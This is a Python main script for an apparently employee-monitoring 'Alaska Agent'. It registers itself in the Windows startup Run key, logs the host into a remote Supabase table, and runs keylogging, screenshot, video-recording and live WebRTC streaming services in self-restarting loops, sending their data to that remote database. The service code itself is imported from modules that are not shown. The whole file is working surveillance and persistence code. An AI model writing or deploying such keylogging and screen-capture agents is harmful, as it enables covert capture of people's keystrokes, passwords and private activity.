import asyncio
import os
import socket
import sys
import traceback
import winreg
import tkinter as tk
import threading
from dotenv import load_dotenv
from supabase import create_client, Client

from services.logger import KeyloggerService
from services.monitor import ScreenshotService
from services.stream import VideoRecorderService
from services.webrtc import WebRTCService

# Paths
if getattr(sys, 'frozen', False):
    application_path = sys._MEIPASS
    exe_path = sys.executable
else:
    application_path = os.path.dirname(os.path.abspath(__file__))
    exe_path = os.path.abspath(__file__)

env_path = os.path.join(application_path, '.env')
load_dotenv(env_path)

SUPABASE_URL = os.getenv("SUPABASE_URL")
SUPABASE_KEY = os.getenv("SUPABASE_KEY")

log_file = os.path.join(os.getenv('APPDATA'), 'AlaskaCache', 'agent.log')
os.makedirs(os.path.dirname(log_file), exist_ok=True)

def log(msg):
    try:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(f"{msg}\n")
        print(msg)
    except:
        pass

def add_to_startup():
    """Add agent to Windows startup registry"""
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "AlaskaAgent", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
        log("Added to startup.")
    except Exception as e:
        log(f"Startup registry error: {e}")

if not SUPABASE_URL or not SUPABASE_KEY:
    log("Error: Supabase credentials not found.")
    sys.exit(1)

supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
hostname = socket.gethostname()
try:
    ip_address = socket.gethostbyname(hostname)
except:
    ip_address = "Unknown"

def show_info_window():
    try:
        root = tk.Tk()
        root.title("Alaska Agent")
        root.geometry("450x200")
        root.attributes("-topmost", True)
        
        cache_path = os.path.join(os.getenv('APPDATA'), 'AlaskaCache')
        
        tk.Label(root, text=f"Agent: {hostname}", font=("Arial", 12, "bold")).pack(pady=10)
        tk.Label(root, text=f"Cache: {cache_path}", font=("Arial", 9), fg="blue").pack(pady=5)
        tk.Label(root, text=f"Log: {log_file}", font=("Arial", 8), fg="gray").pack(pady=5)
        tk.Label(root, text="El agente se ha añadido al inicio de Windows.", font=("Arial", 9), fg="green").pack(pady=5)
        tk.Button(root, text="OK", command=root.destroy, width=15).pack(pady=10)
        
        root.mainloop()
    except Exception as e:
        log(f"GUI Error: {e}")

async def run_service(service, name):
    while True:
        try:
            await service.start()
        except Exception as e:
            log(f"[{name}] Crashed: {e}\n{traceback.format_exc()}")
            await asyncio.sleep(5)

async def heartbeat(supabase, employee_id):
    while True:
        try:
            supabase.table("employees").update({"last_seen": "now()"}).eq("id", employee_id).execute()
        except Exception as e:
            log(f"Heartbeat error: {e}")
        await asyncio.sleep(30)

async def main():
    log("=== Agent Starting ===")
    
    # Add to startup
    add_to_startup()
    
    try:
        response = supabase.table("employees").select("*").eq("hostname", hostname).execute()
        
        if not response.data:
            log("Registering new employee...")
            data = {
                "hostname": hostname,
                "ip_address": ip_address,
                "settings": {"screenshot_interval": 300, "video_duration": 10, "screenshots_enabled": False}
            }
            res = supabase.table("employees").insert(data).execute()
            employee_id = res.data[0]["id"]
        else:
            log("Employee found.")
            employee_id = response.data[0]["id"]
            supabase.table("employees").update({"ip_address": ip_address, "last_seen": "now()"}).eq("id", employee_id).execute()
    except Exception as e:
        log(f"Supabase Init Error: {e}")
        await asyncio.sleep(10)
        return await main()

    threading.Thread(target=show_info_window, daemon=True).start()

    logger_service = KeyloggerService(supabase, employee_id)
    monitor_service = ScreenshotService(supabase, employee_id)
    stream_service = VideoRecorderService(supabase, employee_id)
    webrtc_service = WebRTCService(supabase, employee_id)

    log("Starting services...")

    await asyncio.gather(
        run_service(logger_service, "Keylogger"),
        run_service(monitor_service, "Screenshot"),
        run_service(stream_service, "Video"),
        run_service(webrtc_service, "WebRTC"),
        heartbeat(supabase, employee_id)
    )

if __name__ == "__main__":
    while True:
        try:
            asyncio.run(main())
        except KeyboardInterrupt:
            log("Stopped by user.")
            break
        except Exception as e:
            log(f"Main crash: {e}\n{traceback.format_exc()}")
            import time
            time.sleep(5)
